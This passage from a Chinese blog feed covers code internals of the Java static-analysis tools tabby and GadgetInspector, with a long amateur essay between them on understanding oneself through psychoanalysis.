class="hljs-operator">=</span> stmt.getRightOp();<br>    <span class="hljs-keyword">if</span>(rop <span class="hljs-keyword">instanceof</span> ThisRef)&#123;<br>        context.bindThis(lop);<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(rop <span class="hljs-keyword">instanceof</span> ParameterRef)&#123;<br>        <span class="hljs-type">ParameterRef</span> <span class="hljs-variable">pr</span> <span class="hljs-operator">=</span> (ParameterRef)rop;<br>        context.bindArg((Local)lop, pr.getIndex());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这部分主要是处理this和param的，因为在Jimple里，这两个会被显式的赋值给局部变量处理，tttang那篇这块写的挺好的：</p><p><img src="/../tabby/QQ_1730987898882.png" alt="QQ_1730987898882"></p><p>就不写了。</p><h3 id="caseInvokeStmt"><a href="#caseInvokeStmt" class="headerlink" title="caseInvokeStmt"></a>caseInvokeStmt</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">caseInvokeStmt</span><span class="hljs-params">(InvokeStmt stmt)</span> &#123;<br>    <span class="hljs-comment">// extract baseVar and args</span><br>    <span class="hljs-type">InvokeExpr</span> <span class="hljs-variable">ie</span> <span class="hljs-operator">=</span> stmt.getInvokeExpr();<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;&lt;java.lang.Object: void &lt;init&gt;()&gt;&quot;</span>.equals(ie.getMethodRef().getSignature())) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">if</span>(GlobalConfiguration.DEBUG)&#123;<br>        log.debug(<span class="hljs-string">&quot;Analysis: &quot;</span>+ie.getMethodRef().getSignature() + <span class="hljs-string">&quot;; &quot;</span>+context.getTopMethodSignature());<br>    &#125;<br>    Switcher.doInvokeExprAnalysis(stmt, ie, dataContainer, context, builder);<br>    <span class="hljs-keyword">if</span>(GlobalConfiguration.DEBUG) &#123;<br>        log.debug(<span class="hljs-string">&quot;Analysis: &quot;</span> + ie.getMethodRef().getName() + <span class="hljs-string">&quot; done, return to&quot;</span> + context.getMethodSignature() + <span class="hljs-string">&quot;; &quot;</span>+context.getTopMethodSignature());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>遇到Object的init直接跳了，减少工作量。</p><p>主要逻辑在Switcher.doInvokeExprAnalysis里。</p><p><img src="/../tabby/QQ_1731033944666.png" alt="QQ_1731033944666"></p><p>首先是获得pollution，tabby是这样定义的：<br>-3  不可控</p><p>-2  是source（没太理解具体咋起作用的）</p><p>-1 是来自当前方法所在类的Field</p><p>0-n 是来自当前方法的参数</p><p>例如这个例子：</p><p><img src="/../tabby/QQ_1731034129511.png" alt="QQ_1731034129511"></p><p>写的挺好的我就不写了。</p><p>然后就要继续递归分析调用的这个方法了：<br><img src="/../tabby/QQ_1731034573044.png" alt="QQ_1731034573044"></p><p>从invokeExpr取出invokeMethod，然后创建一个subContext，递归调用doMethodAnalysis。</p><p><img src="/../tabby/QQ_1731034707138.png" alt="QQ_1731034707138"></p><p>m0d9博客提出的问题，因为每次都递归调用到最底层，这个作用就类似于逆拓扑，保证调用时的传播函数可知。</p><p>同样的，最后通过spring save到文件里。</p><p>完。</p>]]></content>
    
    
    
    <tags>
      
      <tag>SAST</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何对自己做心理治疗</title>
    <link href="/2024/11/04/%E5%A6%82%E4%BD%95%E5%AF%B9%E8%87%AA%E5%B7%B1%E5%81%9A%E5%BF%83%E7%90%86%E6%B2%BB%E7%96%97/"/>
    <url>/2024/11/04/%E5%A6%82%E4%BD%95%E5%AF%B9%E8%87%AA%E5%B7%B1%E5%81%9A%E5%BF%83%E7%90%86%E6%B2%BB%E7%96%97/</url>
    
    <content type="html"><![CDATA[<p>如题，大概第一眼看到的反应是，“我难道还有心理问题？”。事实上是，心理非常健康的人群，和超高智商的，运动天赋顶尖的人群一样稀少。</p><p>在一些情况下，生活或工作中的一些问题会使我们略感恐惧，焦虑。或避而不谈，或主动忽视，但经过一段时间后就可以调节过来，这是比较健康的心理，属于正常人的范围。<br>一部分人群会短暂陷入极端情绪，例如强烈的愤怒，过度的焦虑，极端回避问题，极端内向不语等，事实上这些可以视为心理疾病的表现，而且生活中，拥有这些特点的人非常多。</p><p>所以，说是心理疾病并不为过，本篇文章谈到的心理疾病这个词，大部分情况下描述的是一种程度。而非日常所说的“疾病”这个意思。我们在生活中，把有人格障碍或者精神病的人群划为心理疾病，但并不代表现实中没有被确诊为心理疾病的人，不具有心理问题。</p><p>事实上是，在现实中，主动做心理咨询的人，在心理健康程度是高于社会水平的，尤其是在类似中国相当不重视的这种环境下。</p><p>为什么会这样？具体是怎么样的？这就是一个有趣的问题了。</p><p>声明：笔者并非一个专业的心理咨询师，仅仅是业余爱好者，文中也夹杂了一些个人观点，如有不对，极端的地方也是正常的。</p><h1 id="心理疾病的成因"><a href="#心理疾病的成因" class="headerlink" title="心理疾病的成因"></a>心理疾病的成因</h1><h2 id="意识和潜意识"><a href="#意识和潜意识" class="headerlink" title="意识和潜意识"></a>意识和潜意识</h2><p>弗洛伊德的观点是，潜意识与意识不能统一，心理疾病就会产生。这里可以举拖延症为例子。<br>拖延症常见有以下两类：</p><ol><li>越重要的事，越不想做，越拖延</li><li>不得不做的事，越不重要，越不想做，越拖延<br>对于1，最常见的原因是，害怕搞砸，害怕做不好。比如一场大型考试，意识是，我要认真准备，认真对待，而潜意识为：我要是没做好怎么办？假如说，我不去认真准备，即使考差了也没什么，因为这样就没办法体现出我的真实实力了，是我没准备好造成的，故拖延不做。<br>那么此时潜意识和意识做不到统一，拖延就产生了，潜意识害怕发挥全部实力但仍然结果不好，会破坏自己的自恋，所以就干脆拖着耗着。</li></ol><p>对于2，一个常见的原因是，太不重要了，做了就是完全浪费时间，我要把我的精力放在对我有用的事上，然而这件事又是必须要做的，怎么办？我要是做了，就等于我浪费时间，打破了我的自恋（我的时间应该放在对我有益的事上），我要是不做，也是浪费时间，但是我又不想做，陷入了一个循环，所以潜意识干脆就拖着。拖延又产生了。<br>最终的结果可能是，耗费时间的垃圾事没做，对自己有益的事也没做，内耗了很久。</p><p>拖延症是大部分人都会遇到的问题，当然，一般情况下只是很轻微的表现。部分人群会极端拖延，往往对生活和工作造成极大影响。可以视为心理疾病。</p><p>如果一个人潜意识和意识达到统一会如何？即古人所讲的“知行合一”，这是一个很高的境界了，也代表他的心理非常健康，是很稀少的人群。</p><p>但是这个概念有点太底层了，能不能更好的理解呢？我比较喜欢这个说法：当你忽略了过去产生的痛苦，永远逃避而不正视，心理疾病就产生了。</p><h2 id="逃避痛苦"><a href="#逃避痛苦" class="headerlink" title="逃避痛苦"></a>逃避痛苦</h2><p>逃避痛苦是人的天性，尤其是精神上的痛苦，为什么那么多人日复一日的吃苦，而不选择去试一试其他人生路径？因为被动吃苦，比主动吃苦更轻松，脱离群体，代表主动思考，代表主动面对痛苦，然而逃避痛苦是人的天性，故选择被动吃苦。</p><p>避而不谈的惨痛过往，情歌所唱的那个永不及的ta，这些都是人类回避痛苦的表现，而一旦回避痛苦，心理疾病自然就会产生，真正的勇敢者敢于正视痛苦，对痛苦持豁达态度。</p><p>事实上，这又会涉及到一个真理，一旦认识到人生是苦难重重的，那么你就会从苦难中真正解脱出来。</p><p>具体是怎么回避的呢？一个典型的方法是撒谎，如，我爱我的生活，我的父母很爱我，我很满意，我很幸福，自己对自己撒谎，欺骗自己。这些结论是如何得到的？是经过质疑，思考和认真对待瑕疵后，还是一直如此认为，如果是后者，则要警惕有心理问题了。<br>另一个典型的回避方式就是虚无，这些人会感到生活极度无聊，以虚度光阴和沉醉虚拟世界为手段，在无聊厌烦的情绪中度过一天又一天，而从不正视自己内心真正的需求。因为主动思考更为痛苦，被动承受虚无相对好点。但如果从旁观角度来看，则恰恰相反。<br>还有一种相对积极的回避方式是极端努力，这类人会将自己的全部精力放在自己的目标上，但这个目标往往是世俗规定的目标，如考取更高更好的学历，赚更多的钱。而非自己的真正需求，从来不去主动思考，因为主动思考更为痛苦，故被动吃学习&#x2F;工作中的苦。</p><p>当然，这只是常见的情况，真实情况会有更多，更复杂，更千奇百怪的动机，且一个人身上出现多种表现，都是正常的。</p><h2 id="全能自恋"><a href="#全能自恋" class="headerlink" title="全能自恋"></a>全能自恋</h2><p>这是武志红老师提出的概念，我觉得相当适合国人。<br>婴儿的全能自恋有四个阶段：</p><ol><li>我是神，世界的运行都按我的意志运转</li><li>不按我的来，就由神变为魔，欲要摧毁这个世界</li><li>发现自己弱小，就转向攻击自己</li><li>我的一切失败，都是其他人造成的<br>每一条都可以找到对应的人，对于1，一些相当自负的人就会这样想，认为自己一直是对的，怎么可能出错？对于2，譬如一些东亚的家长，一旦自己的孩子不符合自己的意志，哪怕是无理的，也要摧毁和打压孩子。对于3，这些往往是一些神经官能特征的人群，他们很容易会把各种错误归咎到自己身上，总是想“都是我的错”，而自卑，自责，极端的攻击自己，实际上并不全是自己的问题。<br>4不说了。</li></ol><p>现实情况往往更曲折，例如123的人群往往会对自己撒谎，让自己的行为合理化，譬如2中会出现“为你好”，“都是为了你”等谎言，本质上是为了满足自己的全能自恋。</p><p>到这里可能会出现误解，自恋是不好的。实际上也不是，人人都需要自恋，自恋往往是一个人追求卓越，完成任务的动力，适度的自恋有益于个人发展的，而过度的全能自恋往往是有摧毁性的。比如过度自恋也可以让人追求卓越，而且往往要优于常人很多，但他们经常活在痛苦的比较中，对自己有摧毁性。比如像高中这样的集中化竞争的场所，很容易培养出一大批过度自恋的人。我自己显然也是过去的一员，这对我上大学后造成了一定的痛苦。</p><h2 id="一些事实"><a href="#一些事实" class="headerlink" title="一些事实"></a>一些事实</h2><p>所以？说了这么多，怎么按你的标准来，现实中的正常人很少啊！<br>确实如此，我们只把严重影响生活，造成人格障碍的程度划分为心理疾病，而相对较轻的，就选择不重视。</p><p>不重视不代表不存在，事实上心理问题广泛存在于生活中，严重者就会发展为心理疾病，成为神经官能症。</p><p>在美国，据估计只有5%的心理疾病患者会主动寻求心理医生帮助，而剩下95%则完全不会去找心理医生——因为他们觉得自己完全没问题。所以主动思考的人，主动寻求帮助的人，往往都是勇敢的人。有部分其实很反直觉，很多看起来事业有成，在社会上获取了相当的财富和地位，但他们在心灵方面十分懦弱，他们不敢正视自己。<br>这会造成什么现象？富不过三代，纨绔的富二代，因为对自己心理疾病从不重视，或忽视家庭和子女，或对周围人释放毁灭性的攻击性，就会影响到后代。在工作中， I Controll the Universe, 在生活中不敢面对自己的心灵。</p><p>在过去我非常羡慕这些人，羡慕成功，甚至有点崇拜的地步，这实际上是人对自己自恋的追求（通过一定程度地带入别人来想象），适当的自恋是有助于个人发展的，很显然我是过度的人群，后来我意识到，这种成功是建立在世俗评价体系上的，而非自己真正思考得来的，故不再焦虑。</p><p>我在阅读一些精神分析案例集的书时，往往都能看见自己的影子。很多时候觉得，自己被戳脊梁骨。因为很多情况下，正常人身上就是真正的心理疾病的弱化版，所以普通人通过看书学习，只靠自己就主动纠正自己，是完全可以做到的。</p><h2 id="个人观点"><a href="#个人观点" class="headerlink" title="个人观点"></a>个人观点</h2><p>潜意识与意识的理论略显抽象，我认为心理疾病的产生，往往与不尊重事实有关，即不承认现实。</p><p>经常会听到，“你这个人太现实了”，这其实就是人类回避痛苦的表现。当然，现实情况有可能很复杂，比如某个人会尝试用进化论，生物学来完全解释爱情友情和亲情，这并非现实，而是一种以理性保护自我的表现，也是不尊重现实的表现，不承认爱情友情和亲情的美好。本质上也是逃避痛苦，不承认现实。</p><p>不承认现实，也是一种自恋，世界要按我的意志运转的全能自恋。</p><p>但也并非代表着我们必须时刻承认现实，这也是不符合人性的，属于不尊重现实的表现，前提是有能力承受痛苦。如果没有，忽略现实的痛苦，也可以起到保护自己的作用，譬如对小孩说这个世界的阴暗面，必然会对孩子的心灵成长造成伤害，自然不可取。</p><p>这也是心理学比较有趣的地方，或者说抽象到哲学层面，总是会出现很多悖论一样的结论。</p><h2 id="死亡"><a href="#死亡" class="headerlink" title="死亡"></a>死亡</h2><p>为了更好地说明自恋和回避痛苦，我想写写这个话题，如果真正要谈论和面对死亡，会有怎样的想法和感受？<br>死亡是对一个人的自恋的最大摧毁，我们谈死色变，害怕死亡，逃避痛苦。正是人类回避痛苦的天性，死亡会摧毁我们拥有的一切，是对自恋的直接破坏。</p><p>有些人精神上的痛苦超越了死亡带来的，所以就自杀了。正反映了人类逃避痛苦的天性——即使死，也要回避痛苦。</p><p>如果一个人真正摆脱了关于死亡的自恋，会怎么样呢？这时死亡在他眼里就是一种客观规律，我们被父母给予生命，度过一生，然后回归无意识。一切都是自然的，此时会平静的，祥和的面对死亡到来。而非歇斯底里，而非彻底恐惧，这是承认现实的表现，摆脱了自恋的表现，此时在他身上的，更多是神性的光辉。</p><h1 id="如何了解自己"><a href="#如何了解自己" class="headerlink" title="如何了解自己"></a>如何了解自己</h1><h2 id="为什么选择精神分析"><a href="#为什么选择精神分析" class="headerlink" title="为什么选择精神分析"></a>为什么选择精神分析</h2><p>我从小就对心理学感兴趣，在我小学买了本《察言观色》，内容也是字面意思，但是倾向于趋炎附势，去给别人当狗的教程，令我非常失望。在我高中的时候我买过本《微表情心理学》，但这是实时观察，判断是否撒谎的领域，更多用于刑侦。也在网上看过非常多的某某效应，某某心理，但这些都太理想化，现实意义不大。还有很多畅销书，比如通过某些步骤教你改变xx，偏向积极心理学的内容。也不能让我满意。到了大学，我看了阿德勒的《自卑与超越》，了解到了精神分析这个东西，我想这个就是我要的答案了。</p><p>可能有些人看过精神分析鼻祖弗洛伊德的理论，他把什么都往性上靠，其实我认为这是弗洛伊德自己的心理问题，但重要的是他提出的思想，比如潜意识和意识。学习精神分析，更多是学习理论背后的思想，而非像数学，物理这些学科一样精准精确，也非应试教育中的什么就是什么的思考方式。</p><p>等一会，心理学家自己有心理问题？那我能相信他吗？其实正是因为遭受过心理创伤，他们才选择成为心理学家，因为经历过创伤，并选择勇敢正视，心理学家更了解人性，更愿意帮助他人，但由于人的局限性，他们的理论不免会有偏见。但学习精神分析，理论没那么重要，重要的是思想。</p><p>精神分析是干嘛的？可以这样形象的描述，科学可以解释，你遇到喜欢的人，会强烈分泌多巴胺，但是遇到谁分泌？为什么偏偏是ta？科学无法解释。文学会描述和歌颂青年时期美好的爱情，看完让人心神波动。精神分析介于科学和文学（人的感受）之间，是一座桥梁，可以解释为什么你喜欢ta这类问题，而让人产生情感波动。</p><h2 id="了解和治疗自己"><a href="#了解和治疗自己" class="headerlink" title="了解和治疗自己"></a>了解和治疗自己</h2><p>这是个很有趣的问题，往往会涉及到很多悖论，比如，能做到回避痛苦了解自己的人，不需要看别人的方法，而无法了解自己的人，看了别人的方法也没用。</p><p>核心是不变的，克服回避痛苦的天性，才有可能了解自己。事实上认识自己是一个勇敢者的游戏，不分阶层高低，不分财富多少，是否优秀，是否成功，是否善良。只要你是一个人，都需要经过重重磨炼才可以一定程度了解自己。没有人会说完全了解自己，因为人的局限性，后天磨炼也不可能完全克服天性，只可能做到无限接近。</p><h3 id="阅读心理学的书籍"><a href="#阅读心理学的书籍" class="headerlink" title="阅读心理学的书籍"></a>阅读心理学的书籍</h3><p>最简单直接的办法，我更推荐直接看精神分析案例集，我在心理疾病患者身上总是能找到很多相似之处，在阅读时，会产生不适感。这就是回避痛苦的天性的表现了。例如，有可能有人看到我的这篇文章会产生被戳脊梁骨的感觉，会有退出去的冲动。</p><h3 id="一切回忆皆有用"><a href="#一切回忆皆有用" class="headerlink" title="一切回忆皆有用"></a>一切回忆皆有用</h3><p>任何可以回忆起来的事，并且能感受到情绪，很大概率对形成如今的人格有影响，可以学习心理咨询师的分析方式分析自己。比如我之前的这篇<a href="https://www.zhattatey.top/2024/08/05/%E7%8E%B0%E4%BB%A3%E5%BF%83%E7%90%86%E5%AD%A6%E4%B9%8B%E7%B2%BE%E7%A5%9E%E5%88%86%E6%9E%90%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%80%9D%E8%80%83/">文章</a></p><h3 id="承认和提醒"><a href="#承认和提醒" class="headerlink" title="承认和提醒"></a>承认和提醒</h3><p>心理治疗的原理就是让患者意识到自己的潜意识，让潜意识和意识达到统一，在这个过程中，必然要直接面对过往的痛苦，也就是“揭伤疤”，所以承认自己的潜意识是心理治疗的前提之一。<br>在今后遇到类似的情景，提醒为原则，例如再一次的恶性拖延，就可以提醒自己，“哦，这是我太自恋导致的，没必要这样”，多次提醒，可以改善非常多。</p><h3 id="极端化"><a href="#极端化" class="headerlink" title="极端化"></a>极端化</h3><p>直接举例子来说明，例如一个人从小被家里控制，那么他长大在这方面会怎样？更控制他人，还是更希望被控制？<br>事实是你没办法直接判断，有可能他更希望在亲密关系中控制别人，也有可能在设计到评价，比如工作关系中更希望被他人控制，但有一点是可以确定的，即极端化，他会比常人的水平更向两边极端，但具体是哪一边，不能直接确定，要具体看待。</p><h3 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h3><p>最好的治疗方法，仍然是去经历关系，尤其是亲密关系。人是社会性动物，人的一个天性就是，希望被看见。婴儿希望被看见，如果父母关注的多了，婴儿就充满生的能量，如果父母忽视孩子，婴儿就充满暴怒的死的能量。成人在一定程度上也是如此，例如我写这篇文章的目的就是希望被看见。<br>一段好的关系 &gt; 一段坏的关系 &gt; 完全不经历关系，最疗愈自身的方法仍然是去经历人际关系，尤其是亲密关系，可以让我们感知自我边界，拓展自我边界，更好了解自己。</p><p>如果有足够好的运气，可以经历真诚关系，这对人的治愈会起极大的作用。事实上我们很多时候就已经无意的经历了真诚关系，例如中学时代的很值得回忆的友情，例如军营中的战友情。让你感觉到放松，舒适和安全感的关系，可以毫无戒备的表达自我，都可以称为真诚关系。</p><p>心理治疗师无法直接治疗患者，靠的是与患者建立的真诚关系，同样的，如果可以与他人建立真诚关系，不需要心理医生也可以治愈自己。</p><h2 id="吃药"><a href="#吃药" class="headerlink" title="吃药"></a>吃药</h2><p>相当多的人，在确诊抑郁症后，去吃药。</p><p>我自己也吃过一段时间，可以说是相当没用，问题关键在于童年和青年时期未完成的课题，而非单纯的化学治疗。</p><p>有可能会有这种情况，啊！明明是被周围人逼疯的啊？难道是我的错吗？如果从第三者的角度出发，当然不是了，自然是周围的傻逼的问题，但如果从个人的角度出发，当然是，你完全可以选择离开啊，为什么不离开呢？有些女生被渣男伤害，但就是无法离开，为什么有些人可以毫不犹豫的让他滚呢？有些人即使跳楼，也不退学。这又是为什么呢？</p><p>这当然来自过去未解决的问题，形成了这样的性格，导致了这样的结果，所以从个人的角度出发，自然是自己的问题。他人是无法改变的，傻逼就在那，拿他没任何办法。能通过斗争吓住傻逼，也是自己的本事，但很多时候傻逼把握着自己的利益，起冲突对自己还有害。</p><p>选择远离傻逼才是解决之道，但这很多时候要付出代价。</p><h1 id="精神分析不是万能的"><a href="#精神分析不是万能的" class="headerlink" title="精神分析不是万能的"></a>精神分析不是万能的</h1><p>事实上很多人永远不可能通过精神分析来治愈。比如一些极度自恋的人，他们从来不承认自己的任何问题。还有一些极度软弱的人，在面对真实的现实会表现极度脆弱，尽力去避免思考这些问题，让人“心软”而无法继续治疗。这些都是精神分析无法治疗的人，事实上，这些人群永远不会去寻找心理医生。<br>心理疾病如果继续发展，就会变为精神病。精神分析同样无法治疗，如果得了精神病，只能去寻求医院的帮助了。</p><p>真实的成长永远是痛苦的，如果尽力让自己处在安全的领域，认为好的东西都是让人感到舒适的，持有这样的观点，很难成长。<br>如何分辨痛苦也是困难的，到底是被动的承受还是主动接受？例如一个男性认为自己到了一定年纪，放弃过去每天玩着过日子，主动去找工作，去上进。某种程度上来说这其实也是被动承受痛苦。在过去的日子里，丧失了活力，选择每天玩来麻木自己，本质上这也是害怕挑战，丧失生命活力的表现，只是最后无可奈何，不得不去做，过往的课题没有解决，而是隐藏起来，而非主动承受痛苦。<br>主动接受痛苦，更多是精神上的，充满思考性的。</p><p>这是一个很难的课题，需要人去违背天性，需要相当多的思考和学习。</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>想到啥话题就写啥，随便写。</p><h2 id="痛苦的思考"><a href="#痛苦的思考" class="headerlink" title="痛苦的思考"></a>痛苦的思考</h2><p>真正的带来成长的思考必然是痛苦的，这意味着要面对现实，也意味着要打破自己的全能自恋（世界按照我的想法运行），亚里士多德认为物体停下是因为没有给他力，即使他是贤者，也摆脱不了人的局限性，直到后来几个世纪才证实：物体停下来是因为摩擦力。</p><p>能够主动痛苦思考的人，他们不需要学习精神分析也可以获得足够的智慧，而免于心理疾病。</p><p>假如说一个人认为自己很有思想，但并不是痛苦思考得来的，很有可能他是在用理性为自己做保护罩。是假理性。比如我在中学时代就以此阉割回避自己的真实想法，因为在那种环境下，一旦承认自己的真实想法，必然是痛苦的。</p><p>在高中时期，总是隐约觉得学这学那没啥用，事实上除了当大学的敲门砖，对自我的提高，认知的提升极其有限，比如高中未来会用到的知识，大概只需要一年就够用了（如数学相关的）。<br>但我并不敢细想，因为在这种环境下，思考这些必然是影响自己学习的，这会产生痛苦，所以选择回避痛苦——阉割自己的思想。<br>然而这种思想总是隐约存在内心深处，所以我的成绩一直一起一伏，高时感觉安全，便不学了，低时感到不安全，就拼命地补上来。</p><p>然而在从前我又害怕他人评价，这会怎么样？这会导致在高三的时候强迫自己前进，但潜意识又认为，学习这些垃圾解题技巧没用，潜意识和意识分离，心理疾病自然产生，造成一段时间内的轻微抑郁。</p><p>在今年我看了一定数量的书籍，说是开智，不如说是找回了从前的感觉，思考的感觉。解放了自己阉割的思想。</p><p>这么一想，肯定有很多人要比我厉害很多，比如他们的家庭就会告诉他们，学这些就是没用的，你可以适当休息。比如有些人自身能力和心理比较牛逼，无敌自信，老子想的就是对的，爱咋咋地。不难想象这些人日后肯定成就不低。</p><p>正因为主动思考是痛苦的，有自己独特而不被大多数人认可的思想是有摇摇欲坠的不稳定感的，我们大多数人选择被动去吃更大的苦，遭更大的难，在一定情况下并自我感动。</p><p>所以以某个标准看，心理问题广泛存在这样的说法也未尝不对。</p><h2 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h2><p>一旦陷入比较，你就输了。<br>在我学到越来越多的知识，越来越了解自己后，我越发感觉到，我人生中发生的某些事是注定的，必然发生的。即使暂时没有，未来也一定会发生。</p><p>有一些玄乎的说法，比如情劫，事业劫，人际劫，财劫，其实是有一定道理的，在越来越了解人性后，某些人经历某些事，其实是很接近于必然的。</p><p>基因和后天环境共同决定了你的人格，也决定了你做事的动机，所以很多事就是命中注定会遭遇的，不是今天，就是未来。<br>但我们总是以一套标准来比较，比这个比那个，同一个时期，一定要完成xxx（找工作，结婚，买房）才是优秀，否则就要被指点，就要陷入焦虑，更何况这个优秀是怎么定义的，是世俗认可的一套，还是自己思考出来的一套？那既然每人的情况不同，条件不同，思想不同，比较的意义在哪？<br>所以一旦陷入比较，你就输了。即使去比较，那比较的用途也是纠正自己，认识自己，倘若因此激发焦虑和不安，会极大程度扰乱自我思考。</p><h2 id="虚无主义"><a href="#虚无主义" class="headerlink" title="虚无主义"></a>虚无主义</h2><p>在特别年轻，见识不够的情况下，思考过多往往会陷入虚无主义。<br>其实年轻时思虑过多，本身就代表着一种极端化，是一种自恋，不过这种自恋相对来说，算是有益的。其负面影响，最常见的就是滑入虚无主义。这些人会认识到，人生中广泛存在着骗局，代表着对自己生活的不满，例如我们为什么要在上学中如此竞争？对我们究竟有什么好处？对真实的自我有提高吗？结论往往是不好的，但不得不接受，对于心智尚未成熟的人，接受这些是比较艰难的，此时很容易会滑入虚无主义，认为人生没有意义，人类的存在没有意义。这其实都代表着对生活的不满。<br>这么不讲理，怎么能接受啊，其实死亡也是毫不讲理的，而且是最不讲理的几件事了。如果说上学会剥夺你的活力，青春，时间。死亡会几乎剥夺你的一切。<br>这也是难以承认现实的表现，所以，我将经常念叨这些的人，也划分为出现了心理疾病的人，当然这也包括中学时代的自己。</p><h2 id="亲密关系（爱情）"><a href="#亲密关系（爱情）" class="headerlink" title="亲密关系（爱情）"></a>亲密关系（爱情）</h2><p>大多数人只有经历了亲密关系，才展露出真实的自我。所以，可能日常生活中很正常，一旦经历亲密关系，就会做出一些相对奇特的行为，比如完全释放了攻击性，比如完全退行为孩子。<br>大部分时候，我们都会忽略这些事，当做“不理智”的行为，认为谈恋爱降低了两个人的智商。事实上并非如此，正是因为真实，亲密关系会让人放下平日的戒备，展露出真实的自我。在展露出来后，看起来“降低了智商”。这都是正常的过程。</p><p>很少有人能够青丝白发，这是因为大部分人，第一次经历亲密关系并没有维系感情的能力，因为连真实的自我表现出的缺陷都办法解决。</p><p>也有很多人经历了很多段亲密关系，但总是谈一个分一个，这代表了缺乏建立长期亲密关系的能力，其原因必然来自童年或青年时期未完成的课题（忽略过的痛苦）。</p><p>例如一个父亲缺位的家庭，其孩子长大很可能会异常渴望一场完美的爱情，但现实是这种爱情并不存在，这类人往往会用力过猛，导致关系走向终结，甚至于在追求时期过于地位，女方根本看不上男方。再例如在一个异性抚养着长期情绪不稳定长大的孩子，他们很有可能会害怕亲密关系，导致无法建立亲密关系。如果在30岁之前都没能建立过一次亲密关系，那么要警惕是否有心理疾病了。</p><p>其实我一直对一个问题很好奇，我们为何喜欢上别人？一个很重要的原因是自恋，比如慕强，我们并非喜欢这个个体的全部，而喜欢这个人展露的光环。本质上这是自恋，是希望我是这样的，我想变成这样。另一种情况是喜欢弱势地位的人，比如希望去控制ta，这本质上也是自恋，我希望我处于绝对优势地位，控制别人，来满足自己的安全感。当然，现实情况必然十分复杂，但总是有自恋的影子。</p><p>所以追求真爱的过程必然是克服自恋的过程，这需要学习，需要反省和直面痛苦。很多时候，也不是一两年的事，五年十年也有可能。所以说真实的社会里，爱情是稀有的，也是很正常的。如果能遇到就是很幸运的事了。</p><h2 id="心理健康是什么样的？"><a href="#心理健康是什么样的？" class="headerlink" title="心理健康是什么样的？"></a>心理健康是什么样的？</h2><p>这个问题很难给出标准的答案，不同心理学家的说法也不同，我最喜欢温尼科特提出的的“自信且热情”。<br>自信不光是对自己的优势自信，也对自己的缺陷自信，总的来说，是对真实的自我完全接纳，而产生的自信。这做到了不回避痛苦，尊重现实。<br>热情则代表着生命的活力，是这个人充满了生命力的象征。这是很宝贵的状态。</p><h2 id="二元性"><a href="#二元性" class="headerlink" title="二元性"></a>二元性</h2><p>本篇文章始终强调，过度的自恋，逃避痛苦，好像他们是不好的。也并非完全如此。<br>事实上逃避痛苦和过度自恋是保护自己的有效手段，尤其是在一个人幼年的时候，对保护心灵有着相当重要的作用，不然很有可能造成持续性的痛苦，甚至于去自杀。<br>不过在成年后，有了保护自己的手段后，修复和治愈自己是完全可以做到的事，我们常常听到，某个人长大后，性格就不变了。并非如此，人是可以不断超越自己的生物，但这需要勇气和胆量来面对自己，是一件很难的事，少有人会做的事。</p><h2 id="我为什么写这篇文章"><a href="#我为什么写这篇文章" class="headerlink" title="我为什么写这篇文章"></a>我为什么写这篇文章</h2><p>自然是被看见的需求，通俗点说叫想装逼，想有人看见，往底层说是满足自己的自恋。不过这当然是适当的自恋，没什么问题。</p><p>另一个理由是，我很感谢我在过去迷茫的时期看过的博客，他们分享了自己的人生经历，给了我相当多的动力，我很喜欢翻别人博客中的这些内容，很有人情味，所以，我也想在我自己的博客里写下这些，如果我的内容有帮助到别人，那就太好了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>thinking</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GadgetInspector优化学习</title>
    <link href="/2024/10/15/GadgetInspector%E4%BC%98%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/10/15/GadgetInspector%E4%BC%98%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>在上一篇博客学习了GadgetInspector的核心逻辑，当然网上还有很多优化版本，这里学习了5wimming师傅的版本<a href="https://github.com/5wimming/gadgetinspector">https://github.com/5wimming/gadgetinspector</a></p><p>还有主要参考了su18师傅的这篇<a href="https://su18.org/post/gadgetor%EF%BC%8C">https://su18.org/post/gadgetor，</a> 但是作者好像没公布他的工具。</p><h1 id="继承方法"><a href="#继承方法" class="headerlink" title="继承方法"></a>继承方法</h1><p>之前说到这个methodImplMap结构为{某方法：{它的所有重写方法}}， 然后作为构造参数传给了ImplementationFinder。所以这就导致在这一步：</p><p><img src="/../GadgetInspector/QQ_1728961909793.png" alt="QQ_1728961909793"></p><p>并不会查找到从父类继承过来的方法，这样就会导致一些链子找不到。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (allImpls.isEmpty()) &#123;<br>  Set&lt;ClassReference.Handle&gt; parents = inheritanceMap.getSuperClasses(graphCall.getTargetMethod().getClassReference());<br>  <span class="hljs-keyword">if</span> (parents == <span class="hljs-literal">null</span>)<br>    <span class="hljs-keyword">continue</span>;<br>  <span class="hljs-keyword">for</span> (ClassReference.Handle parent : parents) &#123;<br>    Set&lt;MethodReference.Handle&gt; methods = 